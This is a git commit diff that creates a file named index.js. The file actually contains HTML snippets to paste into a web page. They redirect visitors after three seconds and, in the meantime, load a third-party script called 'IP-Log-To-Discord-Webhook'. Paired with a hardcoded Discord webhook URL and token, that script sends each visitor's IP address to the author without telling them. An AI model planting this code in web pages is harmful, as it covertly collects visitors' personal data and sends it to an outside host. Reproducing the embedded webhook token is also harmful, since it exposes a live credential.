04b2d91f1f2f2f48b2c7c8f384975819e8789172
Pinnedyr <168638106+Pinnedyr@users.noreply.github.com>
2024-06-29 17:35:47 +0200

    Create index.js

---
+++ index.js
@@ -0,0 +1,9 @@
+<!-- Copy this into the <head> -->
+<meta http-equiv="refresh" content="3;url=MAINPAGE.html" /> 
+
+...
+
+<!-- Copy this into the end of <body> -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+<script src="https://cdn.jsdelivr.net/gh/luisoos/IP-Log-To-Discord-Webhook/index.js"></script>
+<script>var webHookUrl = "https://discord.com/api/webhooks/1256629643147214848/S_KlGZ0aHncGM9OTqdj6zg4Nh9DGbnVfGWsJk-R8jN5NVnbZs3ck56bv3vRPHZx5EI_b";</script>
